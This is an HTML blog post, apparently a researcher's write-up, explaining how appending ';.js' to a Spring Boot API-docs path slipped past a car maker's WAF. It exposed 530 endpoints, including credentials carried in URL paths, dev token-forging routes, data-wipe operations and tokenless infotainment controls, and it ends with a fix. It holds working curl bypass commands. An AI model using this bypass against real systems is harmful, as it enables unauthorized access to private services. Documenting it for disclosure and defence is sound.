@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>How a Semicolon Exposed 530 API Endpoints on a Major Car Manufacturer's Platform — katabasis</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<header>
+  <div class="container">
+    <a href="../" class="site-title">katabasis</a>
+  </div>
+</header>
+<main class="container">
+<a href="../" class="back">all write-ups</a>
+<article>
+<h1>How a Semicolon Exposed 530 API Endpoints on a Major Car Manufacturer's Platform</h1>
+<p>I was looking at the digital manual platform of one of the biggest car manufacturers in the world. The system serves vehicle documentation in 45 languages and connects to the in-car infotainment system. It runs on Spring Boot.</p>
+<p>Standard recon: check for <code>/v3/api-docs</code>. Blocked. Connection reset. WAF doing its job.</p>
+<p>Then I added <code>;.js</code> to the path.</p>
+<pre><code class="language-bash"># Blocked
+curl -sk &quot;https://[TARGET]/v3/api-docs&quot;
+# Status: 000, Size: 0
+
+# Bypassed
+curl -sk &quot;https://[TARGET]/v3/api-docs;.js&quot;
+# Status: 200, Size: 496362
+</code></pre>
+<p>Half a megabyte of OpenAPI spec. 530 endpoints. The WAF saw a <code>.js</code> file request. Spring Boot stripped the semicolon (matrix parameter per RFC 3986) and served the docs.</p>
+<p>Same bypass worked on all 5 hosts including production.</p>
+<h2>What was inside</h2>
+<p>Credentials in URL paths:</p>
+<pre><code>GET /api/moapi/V9/authenticate/auth/{userName}/{password}
+</code></pre>
+<p>Every login attempt logged in plaintext in access logs, proxy logs, browser history. I confirmed the endpoint accepted requests on production without auth - returned <code>[]</code> for bad creds instead of an error.</p>
+<p>Dev endpoints on production:</p>
+<pre><code>POST /api/dev/consumer/token/create
+GET  /api/dev/consumer/token/decode
+</code></pre>
+<p>Token create + decode = forged auth.</p>
+<p>Internal service token endpoints:</p>
+<pre><code>GET /api/vw-services/V1/idk/access-token
+GET /api/vw-services/V1/gvf/auth-token
+</code></pre>
+<p>Destructive admin ops:</p>
+<pre><code>POST /api/data/V2/clear          -- wipes all data
+DELETE /api/users/V1/user/{name} -- deletes users
+</code></pre>
+<p>In-car infotainment management:</p>
+<pre><code>GET /api/mibtokenless/V1/queryRemoteReset
+GET /api/mibtokenless/V1/downloadPackages/{f}/{token}
+</code></pre>
+<p>The word "tokenless" in that path tells you everything.</p>
+<h2>Why it works</h2>
+<p>The WAF and Spring Boot parse URLs differently. WAF sees <code>/v3/api-docs;.js</code> as a JS file. Spring sees <code>/v3/api-docs</code> with a matrix param. Two parsers, two interpretations, one gap.</p>
+<p>Fix: enable <code>StrictHttpFirewall</code> in Spring Security (rejects semicolons), or just disable API docs in prod.</p>
+<p>This bypass is well documented. It keeps working because WAF rules match what the WAF sees, not what the app sees.</p>
+</article>
+</main>
+<footer>
+  <div class="container">&copy; 2025 &mdash; responsible disclosure, always.</div>
+</footer>
+</body>
+</html>
